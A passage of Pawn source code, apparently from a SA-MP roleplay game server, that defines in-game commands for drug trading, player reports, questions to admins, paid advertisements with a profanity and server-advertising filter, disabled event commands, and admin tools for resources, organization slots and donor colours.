                        PlayerInfo[ igrac ][ xDrugCode ][ 3 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
                        PlayerInfo[ igrac ][ xDrug ][ 3 ] = kolicina;
					}
			        else if( PlayerInfo[ igrac ][ xDrugCode ][ 4 ] == 0)
			        {
                        PlayerInfo[ igrac ][ xDrugCode ][ 4 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
                        PlayerInfo[ igrac ][ xDrug ][ 4 ] = kolicina;
					}
					if( ( PlayerInfo[ playerid ][ xDrug ][ slot2 ]-kolicina ) < 1 )
					    PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] = 0;
					PlayerInfo[ playerid ][ xDrug ][ slot2 ] -= kolicina;
					
					SavePlayer( playerid );
					SavePlayer( igrac );
				} else SendErrorMessage( playerid, "Taj igrac nije dovoljno blizu vas.");
			}
		}
		return 1;
	}
	else {
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/droga [opcija]");
     	SCM( playerid, BELA, "[Opcije] test, give, view, napravi, posadi, oberi, osusi, buyseeds, buyilegal");
     	SCM( playerid, BELA, "[Opcije] use, show, vremedobranja, mix");
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
	}
	return 1;
}

CMD:prijavibug( playerid, params[] ) {

	new tekst[ 64 ];
    if( sscanf( params, "s[64]", tekst ) ) return SendUsageMessage( playerid, "/prijavibug [ tekst ]");

    new string1[ 128 ];
	format( string1, sizeof( string1 ), "Igrac %s: %s", ImeIgraca( playerid ), tekst );
	LogSave( "Ostalo/LogPrijaveBugova.log", string1 );

	SendInfoMessage( playerid, "Prijavili ste bug." );
	SendInfoMessage( playerid, "Vas bug glasi: %s.", tekst );

	return 1;
}

CMD:report( playerid, params[] ) {
    // if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes da koristis ovu komandu dok si u zatvoru." );
    if( ServerInfo[ Report ] == false ) return SendErrorMessage( playerid, "Trenutno nije moguce slanje reporta Admin TEAM-u." );
    if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    new id, rstring[128], string[ 234 ];
    if( sscanf( params, "us[128]", id, rstring ) ) return SendUsageMessage( playerid, "/report [ ID/Deo imena ] [ Text ]");
    if( ReportGlobal[ playerid ] > 0 ) return SendErrorMessage( playerid, "Morate cekati 60 sekundi prije novog reporta/pitanja!");
	if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID igraca." );
	format( string, sizeof( string ), ""col_red"|REPORT| %s(ID:%d) -> %s(ID:%d): %s", ImeIgraca( playerid ), playerid, ImeIgraca( id ), id, rstring );
	AdminRPoruka( -1, string );
 	SCM( playerid, ZUTA, "Online Admin ce vam odgovoriti u najkracem mogucem roku.." );
 	SendClientMessageEx( playerid, ZUTA, "Vas report glasi: %s." , rstring );
 	ReportGlobal[ playerid ] = 60;
 	return 1;
}

CMD:pitaj( playerid, params[] ) {

    // if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes da koristis ovu komandu dok si u zatvoru." );
    if( ServerInfo[ Pitanja ] == false ) return SendErrorMessage( playerid, "Trenutno nije moguce slanje pitanja Admin TEAMU." );
    if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");

    if( askqInfo[ playerid ][ askqSended ] == true ) return SendErrorMessage( playerid, "Vec si poslao pitanje, nije vam odgovoreno ili nisi pogledao." );
    if( ReportGlobal[ playerid ] > 0 ) return SendErrorMessage( playerid, "Morate cekati 60 sekundi prije novog reporta/pitanja!");

    new text[ 128 ];
	if( sscanf( params, "s[128]", text ) ) {
		SendUsageMessage( playerid, "/pitaj [ Text ]" );
		return 1;
	}
	
	new askQ = -1;

	for( new id = 1; id < MAX_ASKQS; id++ ) {
		if( askqList[ id ][ askqSend ] == false ) {
			askQ = id;
			break;
		}
	}

    if( askQ == -1 ) return SendErrorMessage( playerid, "Vec ima maksimalan broj poslatih pitanja." );

	askqList[ askQ ][ askqSend ] = true;
	askqList[ askQ ][ askqID ] = playerid;
	
	askqInfo[ playerid ][ askqSended ] = true;
	askqInfo[ playerid ][ askqAnswered ] = false;

	strmid( askqList[ askQ ][ askqOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 32 );
	strmid( askqList[ askQ ][ askqQuestion ], text, 0, strlen( text ), 128 );

	SendInfoMessage( playerid, "Poslao si pitanje Admin TEAM-u i Helperima." );

    ReportGlobal[ playerid ] = 60;
	
	format( globalstring, sizeof( globalstring ), ""col_pitaj"|P| %s (%d) je poslao pitanje.( /lp )", ImeIgraca( playerid ), playerid );
	RPTChat( -1, globalstring );
    format( globalstring, sizeof( globalstring ), ""col_pitaj"|P| %s (%d) ( %s )", ImeIgraca( playerid ), playerid, text );
    RPTChat( -1, globalstring );

    return 1;
}
alias:pitaj("askq");

// CMD:pogledajodgovor( playerid, params[] ) {

// 	if( askqInfo[ playerid ][ askqSended ] == false ) return SendErrorMessage( playerid, "Nisi poslao pitanje." );
//     if( askqInfo[ playerid ][ askqAnswered ] == false ) return SendErrorMessage( playerid, "Nije odgovoreno na tvoje pitanje." );

// 	new string[ 256 ];
// 	format( string, sizeof( string ), "Admin/Helper %s je odgovorio na tvoje pitanje.\n\nOdgovor: %s", askqInfo[ playerid ][ askqAdmin ], askqInfo[ playerid ][ askqAnswer ] );

// 	SPD( playerid, 0, DSMSG, D_NASLOV, string, "Potvrdi", "" );
	
// 	askqInfo[ playerid ][ askqSended ] = false;
// 	askqInfo[ playerid ][ askqAnswered ] = false;
// 	strmid( askqInfo[ playerid ][ askqAdmin ], "None", 0, strlen( "None" ), 32 );
// 	strmid( askqInfo[ playerid ][ askqAnswer ], "None", 0, strlen( "None" ), 128 );
// 	return 1;
// }

alias:new("novi", "pomoc");
CMD:new( playerid, params[] ) {
    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes da koristis ovu komandu dok si u zatvoru." );
	if( GetPlayerInterior( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozes zvati /new ako si u interioru!");
	if( PlayerInfo[ playerid ][ xLevel ] > 1 ) return SendErrorMessage( playerid, "Samo do levela 2." );
    if( NewGlobal[ playerid ] > 0 ) return SendErrorMessage( playerid, "Morate cekati 60 sekundi prije novog /newa!");
	format( globalstring, sizeof( globalstring ), "*Igrac [%d]%s je novi na serveru i trazio je pomoc!",playerid, ImeIgraca( playerid ) );
	RPTChat( SVETLOPLAVA, globalstring );
	SCM( playerid, 0x33CCFFAA, "Poslali ste zahtev za pomoc, STAFF ce vam se ubrzo obratiti ukoliko je online.");
    NewGlobal[ playerid ] = 60;
	return 1;
}

CMD:animacije( playerid, params[] ) {
    SCM( playerid, SVETLOPLAVA, "__________________________ANIMACIJE___________________________");
    SCM( playerid, BELA, "/fall - /injured - /akick - /push - /handsup - /bomb - /drunk - /getarrested - /laugh ");
    SCM( playerid, BELA, " /basket - /medic - /spray - /robman - /taichi - /lookout - /kiss - /cellin - /cellout - /crossarms - /lay");
    SCM( playerid, BELA, "/deal - /crack - /smoke - /groundsit - /chat - /dance - /fucku - /strip - /hide - /vomit - /eat");
    SCM( playerid, BELA, "/koface - /kostomach - /dealstance - /rap - /sup - /reload - /sit - /wankin - /bat1 - /bat2 - /piss");
    SCM( playerid, BELA, "/exhaust - /leftslap - /hoodfrisked - /lightcig - /tapcig - /box - /lay2 - /lean - /wall - /fwalk");
    SCM( playerid, BELA, "/cop - /elbow - /fstance - /lowthrow - /highthrow - /aim - /gwalk - /celebrate - /riot1 - /riot2 - /riot3");
    SCM( playerid, BELA, "/ghand - /comeon - /fuckit - /scared - /caranim - /no - /crawl - /walk");
    return 1;
}

CMD:smsad( playerid, params[] ) {
	if( ServerInfo[ Oglasi ] == false ) return SendErrorMessage( playerid, "Trenutno nije moguce slati oglase." );
	if( isnull( params ) ) return SendUsageMessage( playerid, "/smsad [IC reklamni text]");
	if( PlayerInfo[ playerid ][ xLevel ] < 3 ) return SendErrorMessage( playerid, "Nisi level 3!");
	if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete poslati oglas dok ste u zatvoru / Area51.");
    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0 ) return SendErrorMessage( playerid, "Nemate mobilni telefon!" );

    if(oglasTimer[playerid] >= 1) return SendErrorMessage(playerid, "Novi oglas mozes postaviti za %d sekundi!", oglasTimer[playerid]);

	for( new i = 0; i < strlen( params ); i++ ) {
 		if(strfind( params[ i ], "server", true) == 0
   		|| strfind( params[ i ], "IP", true) == 0
        || strfind( params[ i ], ".", true) == 0
		|| strfind( params[ i ], ":1", true) == 0
		|| strfind( params[ i ], ":2", true) == 0
		|| strfind( params[ i ], ":3", true) == 0
		|| strfind( params[ i ], ":4", true) == 0
		|| strfind( params[ i ], ":5", true) == 0
		|| strfind( params[ i ], ":6", true) == 0
		|| strfind( params[ i ], ":7", true) == 0
		|| strfind( params[ i ], ":8", true) == 0
		|| strfind( params[ i ], ":9", true) == 0
		|| strfind( params[ i ], ";", true) == 0
		|| strfind( params[ i ], "jebem", true) == 0
		|| strfind( params[ i ], "bog", true) == 0
		|| strfind( params[ i ], "mater", true) == 0
		|| strfind( params[ i ], "kreten", true) == 0
		|| strfind( params[ i ], "admin", true) == 0
		|| strfind( params[ i ], "jebeni", true) == 0
		|| strfind( params[ i ], ".com", true) == 0
		|| strfind( params[ i ], ".net", true) == 0
		|| strfind( params[ i ], ".org", true) == 0
		|| strfind( params[ i ], ".info", true) == 0
		|| strfind( params[ i ], "www", true) == 0
		|| strfind( params[ i ], "glup", true) == 0
		|| strfind( params[ i ], "majka", true) == 0
		|| strfind( params[ i ], "majku", true) == 0)
  		{
    		SendErrorMessage( playerid, "Nedozvoljene rijeci/znakovi u oglasu!");
         	return 1;
    	}
	}
	if( ( !adds ) && ( PlayerInfo[ playerid ][ xAdmin ] < 1 ) ) {
		SendErrorMessage( playerid, "Pokusaj ponovno %d sekundi izmedju oglasa !",  (addtimer/1000));
		return 1;
	}
	new payout = strlen(params) * 2;
	if( PlayerInfo[ playerid ][ xTelefonBon ] < payout ) {
 		SendErrorMessage( playerid, "Nemate dovoljno novaca na racunu(Cena toliko znakova:  $%d ) ", payout);
     	return 1;
	}
	
	format( globalstring, sizeof( globalstring ), "Oglas: "col_white"%s",  params );
	OOCNews( ZUTA, globalstring );
	
	foreach( Player, i ) {
	    if( PlayerLogged[ i ] ) {
		    if( PlayerInfo[ i ][ xAdmin ] > 0 || PlayerInfo[ i ][ xSupporter ] > 0 ) {
		        format( globalstring, sizeof( globalstring ), "Oglas: %s | [ID:%d] | Broj: %d", ImeIgraca( playerid ), playerid, PlayerInfo[ playerid ][ xBrojTelefona ] );
				SCM( i, 0x00D900C8, globalstring );
		    }
		    else {
    			if( !gNews{ i } ) {
				    format( globalstring, sizeof( globalstring ), "Oglas: %s | Broj: %d", ImeIgraca( playerid ), PlayerInfo[ playerid ][ xBrojTelefona ] );
					SCM(i, 0x00D900C8, globalstring );
				}
		    }
		}
	}

	PlayerInfo[ playerid ][ xTelefonBon ] -= payout;
	format( globalstring, sizeof( globalstring ), "~r~Placeno za reklamu: $%d", payout);
	GameTextForPlayer( playerid, globalstring, 5000, 5 );
    oglasTimer[playerid] = 600;
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) { SetTimer( "AddsOn", addtimer, false ); adds = false; }
    return 1;
}

alias:ad("oglas");
CMD:ad( playerid, params[] ) {
	if( ServerInfo[ Oglasi ] == false ) return SendErrorMessage( playerid, "Trenutno nije moguce slati oglase." );
	if( isnull( params ) ) return SendUsageMessage( playerid, "/ad [IC reklamni text]");
	if( PlayerInfo[ playerid ][ xLevel ] < 3 ) return SendErrorMessage( playerid, "Nisi level 3!");
	if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete poslati oglas dok ste u zatvoru / Area51.");
	if( !IsPlayerInRangeOfPoint( playerid, 5.0, 229.5878,1146.4447,459.2804 ) ) return SendErrorMessage( playerid, "Morate biti kod Novinara da bi ste mogli poslati oglas!");
    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0 ) return SendErrorMessage( playerid, "Nemate mobilni telefon!" );

    if(oglasTimer[playerid] >= 1) return SendErrorMessage(playerid, "Novi oglas mozes postaviti za %d sekundi!", oglasTimer[playerid]);

	for( new i = 0; i < strlen( params ); i++ ) {
 		if(strfind( params[ i ], "server", true) == 0
   		|| strfind( params[ i ], "IP", true) == 0
        || strfind( params[ i ], ".", true) == 0
		|| strfind( params[ i ], ":1", true) == 0
		|| strfind( params[ i ], ":2", true) == 0
		|| strfind( params[ i ], ":3", true) == 0
		|| strfind( params[ i ], ":4", true) == 0
		|| strfind( params[ i ], ":5", true) == 0
		|| strfind( params[ i ], ":6", true) == 0
		|| strfind( params[ i ], ":7", true) == 0
		|| strfind( params[ i ], ":8", true) == 0
		|| strfind( params[ i ], ":9", true) == 0
		|| strfind( params[ i ], ";", true) == 0
		|| strfind( params[ i ], "jebem", true) == 0
		|| strfind( params[ i ], "bog", true) == 0
		|| strfind( params[ i ], "mater", true) == 0
		|| strfind( params[ i ], "kreten", true) == 0
		|| strfind( params[ i ], "admin", true) == 0
		|| strfind( params[ i ], "jebeni", true) == 0
		|| strfind( params[ i ], ".com", true) == 0
		|| strfind( params[ i ], ".net", true) == 0
		|| strfind( params[ i ], ".org", true) == 0
		|| strfind( params[ i ], ".info", true) == 0
		|| strfind( params[ i ], "www", true) == 0
		|| strfind( params[ i ], "glup", true) == 0
		|| strfind( params[ i ], "majka", true) == 0
		|| strfind( params[ i ], "majku", true) == 0)
  		{
    		SendErrorMessage( playerid, "Nedozvoljene rijeci/znakovi u oglasu!");
         	return 1;
    	}
	}
	if( ( !adds ) && ( PlayerInfo[ playerid ][ xAdmin ] < 1 ) ) {
		SendErrorMessage( playerid, "Pokusaj ponovno %d sekundi izmedju oglasa !",  (addtimer/1000));
		return 1;
	}
	new payout = strlen(params) * 150;
	if( PlayerInfo[ playerid ][ xNovac ] < payout) {
 		SendErrorMessage( playerid, "Nemate dovoljno novaca(Cena toliko znakova:  $%d ) ", payout);
     	return 1;
	}
	
	format( globalstring, sizeof( globalstring ), "Oglas: "col_white"%s",  params );
	OOCNews( ZUTA, globalstring );
	
	foreach( Player, i ) {
	    if( PlayerLogged[ i ] ) {
		    if( PlayerInfo[ i ][ xAdmin ] > 0 || PlayerInfo[ i ][ xSupporter ] > 0 ) {
		        format( globalstring, sizeof( globalstring ), "Oglas: %s | [ID:%d] | Broj: %d", ImeIgraca( playerid ), playerid, PlayerInfo[ playerid ][ xBrojTelefona ] );
				SCM( i, 0x00D900C8, globalstring );
		    }
		    else {
    			if( !gNews{ i } ) {
				    format( globalstring, sizeof( globalstring ), "Oglas: %s | Broj: %d", ImeIgraca( playerid ), PlayerInfo[ playerid ][ xBrojTelefona ] );
					SCM(i, 0x00D900C8, globalstring );
				}
		    }
		}
	}
	
	DajIgracuNovac( playerid, - payout );
	format( globalstring, sizeof( globalstring ), "~r~Placeno za reklamu: $%d", payout);
	GameTextForPlayer( playerid, globalstring, 5000, 5 );
    oglasTimer[playerid] = 600;
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) { SetTimer( "AddsOn", addtimer, false ); adds = false; }
    return 1;
}

CMD:exit( playerid, params[] ) {
    if( PlayerCP[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozete komandu dok ste u eventu." );
    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
	if( IsPlayerInAnyVehicle( playerid ) ) {
		Novi_RemovePlayerFromVehicle( playerid ); UsaoAutoProdaja[ playerid ] = -1;
	    if(GetPVarInt( playerid, "NoFuel") == 1) {
	    	Novi_RemovePlayerFromVehicle( playerid );
		    SetPVarInt( playerid, "NoFuel", 0 );
		}

		SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
	}
	return true;
}

CMD:evozaci(playerid,params[]) {

    return SendErrorMessage(playerid, "Iskljucena opcija!! Koristi specijalne evente, /eventhelp");

 //    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
	// 	new str[128];
	// 	SCM( playerid, SVETLOPLAVA, " _______ Vozaci _______");
	// 	foreach( Player, i ) {
	// 	    if( PlayerCP[ i ] > 0 ) {
	// 		    format( str, sizeof( str ), " - %s (id: %d)", ImeIgraca(i),i );
	// 			SCM( playerid, BELA, str );
	// 		}
	// 	}
 //    } else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	// return 1;
}

CMD:e(playerid,params[]) {

    return SendErrorMessage(playerid, "Iskljucena opcija!! Koristi specijalne evente, /eventhelp");
 //    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
 //        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	// 	new text[ 128 ], string[ 234 ];
	// 	if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/e [ text ]");
	// 	format( string, sizeof( string ), "(( EVENT | %s kaze: %s ))", ImeIgraca( playerid ), text );
	// 	foreach( Player, i ) {
	// 	    if( IsPlayerNearPlayer( 25.0, playerid, i ) ) {
	// 	        SCM( i, SVETLOPLAVA, string );
	// 	    }
	// 	}
 //    } else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	// return 1;
}

CMD:elist( playerid, params[] ) {
    return SendErrorMessage(playerid, "Iskljucena opcija!! Koristi specijalne evente, /eventhelp");
 //    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
 //    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
 //        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
        
	// 	strcat( DialogStrgEx, "1 Torch | 2 LV Aero-kruzna | 3 Los Santos Race\n4 VineWood Race | 5 Moto Race | 6 Slamvan Race\n7 Las Venturas City Race | 8 Las Venturas Street Race | 9 Offroad LV Rudnik\n10 Idlewood Race | 11 Downtown Los Santos | 12 Santa Maria Beach Race\n13 Blueberry Race | 14 Palomino Creek Race | 15 Fort Carson Race\n16 Sanchez Race | 17 San Fierro City Race | 18 Doherty Race\n19 LS Aero Kruzna | 20 SF Aero Kruzna | 21 Verdant Meadows Race\n22 Angel Pine Race | ");
	// 	strcat( DialogStrgEx, "23 Buffalo Race | 24 Kartmanijak\n25 OffroadKing | 26 BulletRun | 27 Elegy Power\n28 Speed | 29 Sabre Drift | 30 East Ls Race\n31 VineWood Challenge | 32 Funny Aero Race | 33 Sultan Mountain\n34 Village Race | 35 BeaSM beetle | 36 Hood Race\n37 Get Lucky | 38 Tram Race");

	// 	SPD( playerid, dialog_HELP, DSMSG, ""col_crvena"Lista eventa", DialogStrgEx, "Potvrdi", "" );
 //    	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	// } else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	// return 1;
}

CMD:eventhelp( playerid, params[] ) {
	SCM( playerid, SVETLOPLAVA, ""col_crvena"___________________________________________________________________");
	SCM( playerid, -1, ""col_crvena"Event HELP | "col_white"/eucitaj /eugasi /e /evozaci /elist /eventizlaz ( za igrace )" );
    SCM( playerid, -1, ""col_crvena"Event HELP SPECIJALNI | /pokrenihungergames /zaustavihg /hgcount | /pokrenifunrace /zaustavifr /frcount" );
    SCM( playerid, -1, ""col_crvena"Event HELP SPECIJALNI | /pokrenihotrun /zaustavihotrun /hrcount | /pokrenideaglemaster /zaustavidm /dmcount" );
    SCM( playerid, -1, ""col_crvena"Event HELP SPECIJALNI | /pokrenipubg /zaustavipubg /pubgcount" );
    SCM( playerid, SVETLOPLAVA, ""col_crvena"___________________________________________________________________");
	return true;
}

CMD:dopuniresurse( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new izbor, kolicina;
	if( sscanf( params, "ii", izbor, kolicina ) ) {
		SendUsageMessage( playerid, "/dopuniresurse [ izbor ] [ kolicina ]" );
		SCM( playerid, BELA, "[Izbor] 1. Drva | 2. Gorivo | 3. Zlato" );
		SendInfoMessage( playerid, "Trenutno ima: Drva( %d ), Gorivo( %dL ), Zlato( %dg ).", ServerInfo[ Drva ], ServerInfo[ Gorivo ], ServerInfo[ Zlato ] );
		return 1;
	}
    if( izbor == 1 ) {
    
        ServerInfo[ Drva ] += kolicina;
   		SaveServerStats( );
   		SendInfoMessage( playerid, "Dodao si %d drva u resurse.", kolicina );
    }
    else if( izbor == 2 ) {
    
        ServerInfo[ Gorivo ] += kolicina;
   		SaveServerStats( );
   		UpdateGorivoLabel( );
   		SendInfoMessage( playerid, "Dodao si %dL goriva u resurse.", kolicina );
    }
    else if( izbor == 3 ) {

        ServerInfo[ Zlato ] += kolicina;
   		SaveServerStats( );
   		
   		new zlatostring[ 256 ];
		format( zlatostring, sizeof( zlatostring ), ""col_white"Trenutno u sefu ima "col_crvena"%dg "col_white"zlata\n"col_white"Da opljackate zlataru kucajte\n"col_crvena"[ /pljackajzlataru ]", ServerInfo[ Zlato ] );
		UpdateDynamic3DTextLabelText( ServerInfo[ ZlatoLabel ], BELA, zlatostring );
   		
   		SendInfoMessage( playerid, "Dodao si %dg zlata u resurse.", kolicina );
    }
    else return SendErrorMessage( playerid, "Pogresan izbor." );
    return true;
}

CMD:ocistislot( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] > 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4  ) {
    
    	if( PlayerInfo[ playerid ][ xAdmin ] > 5 ) { if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" ); }

		new OrgID, izbor, broj, oFile[ 64 ];
		if( sscanf( params, "iii", OrgID, izbor, broj ) ) {
			SendUsageMessage( playerid, "/ocistislot [ OrgID ] [ izbor ] [ broj slota ]" );
			SCM( playerid, BELA, "[Izbor] 1. Lider | 2. Clan" );
			SCM( playerid, NARACRVENA, "Koristi /spisakclanova da vidis spisak clanova." );
			return 1;
		}
		format( oFile, sizeof( oFile ), O_FILE, OrgID );
	    if( !fexist( oFile ) ) return SendErrorMessage( playerid, "Ova organizacija ne postoji u bazi podataka." );
		if( izbor == 1 ) {

			if( broj == 1 ) {

				strmid( OI[ OrgID ][ oLider1 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
				SaveOrganization( OrgID );
				SendClientMessageEx( playerid, CRVENA, "Ocistili ste prvi slot lidera organizacije %s", OI[ OrgID ][ oName ] );
			}
			else if( broj == 2 ) {

				strmid( OI[ OrgID ][ oLider2 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN);
				SaveOrganization( OrgID );
				SendClientMessageEx( playerid, CRVENA, "Ocistili ste drugi slot lidera organizacije %s", OI[ OrgID ][ oName ] );
			}
			else return SendErrorMessage( playerid, "Lider slot postoji samo 1 i 2." );
		}
		else if( izbor == 2 ) {

			if( broj < 1 || broj > 30 ) return SendErrorMessage( playerid, "Clan slot postoji od 1 do 30." );

		    if( broj == 1 ) strmid( OI[ OrgID ][ oClan1 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 2 ) strmid( OI[ OrgID ][ oClan2 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 3 ) strmid( OI[ OrgID ][ oClan3 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 4 ) strmid( OI[ OrgID ][ oClan4 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 5 ) strmid( OI[ OrgID ][ oClan5 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 6 ) strmid( OI[ OrgID ][ oClan6 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 7 ) strmid( OI[ OrgID ][ oClan7 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 8 ) strmid( OI[ OrgID ][ oClan8 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 9 ) strmid( OI[ OrgID ][ oClan9 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 10 ) strmid( OI[ OrgID ][ oClan10 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 11 ) strmid( OI[ OrgID ][ oClan11 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 12 ) strmid( OI[ OrgID ][ oClan12 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 13 ) strmid( OI[ OrgID ][ oClan13 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 14 ) strmid( OI[ OrgID ][ oClan14 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 15 ) strmid( OI[ OrgID ][ oClan15 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 16 ) strmid( OI[ OrgID ][ oClan16 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 17 ) strmid( OI[ OrgID ][ oClan17 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 18 ) strmid( OI[ OrgID ][ oClan18 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 19 ) strmid( OI[ OrgID ][ oClan19 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 20 ) strmid( OI[ OrgID ][ oClan20 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 21 ) strmid( OI[ OrgID ][ oClan21 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 22 ) strmid( OI[ OrgID ][ oClan22 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 23 ) strmid( OI[ OrgID ][ oClan23 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 24 ) strmid( OI[ OrgID ][ oClan24 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 25 ) strmid( OI[ OrgID ][ oClan25 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 26 ) strmid( OI[ OrgID ][ oClan26 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 27 ) strmid( OI[ OrgID ][ oClan27 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 28 ) strmid( OI[ OrgID ][ oClan28 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 29 ) strmid( OI[ OrgID ][ oClan29 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
		    else if( broj == 30 ) strmid( OI[ OrgID ][ oClan30 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );

		    SaveOrganization( OrgID );
		    SendClientMessageEx( playerid, CRVENA, "Ocistili ste %d slot clana organizacije %s.", broj, OI[ OrgID ][ oName ] );
		}
		else return SendErrorMessage( playerid, "Pogresan izbor." );
		
	} else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return true;
}

CMD:vipboja( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xVIPLevel ] == 6 || PlayerInfo[playerid][xDBO]) {
	

		SPD( playerid, dialog_DONATORBOJA, DSL, "{07C1F5}Odaberite Boju", "1.SCRVENA \t\t{FF8080}|| \n2.CRVENA \t\t{FF0000}||\n3.SPLAVA \t\t{80FFFF} ||\n4.ORANGE \t\t{FF8040}||\n5.ROZA \t\t{FF62B0}||\n6.SIVA \t\t{C0C0C0}||\n7.ZELENA \t\t{00FF00}||\n8.ZUTA \t\t{FFFF00}||\n9.TZELENA \t\t{008000}||\n10.PLAVA \t\t{0000FF}||","Odaberi","Izadji");
	} else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	return true;
}

CMD:donatorskeboje( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    new ID;
    if( sscanf( params, "u", ID ) ) return SendUsageMessage( playerid, "/donatorskeboje [ ID/Deo Imena ]");
	if( ID == IPI ) return SendErrorMessage( playerid, "Pogresan ID korisnika." );
	
	if( !PlayerInfo[ ID ][ xDBO ] ) {
	
		PlayerInfo[ ID ][ xDBO ] = true;
		SendInfoMessage( ID, "Admin %s vam je Aktivirao Donatorski paket (BOJE) -> Koristi /vipboja", ImeIgraca( playerid ) );
	    SendInfoMessage( playerid, "Aktivirao si Donatorski paket (BOJE) igracu %s", ImeIgraca( ID ) );
	    SavePlayer( ID );
	}
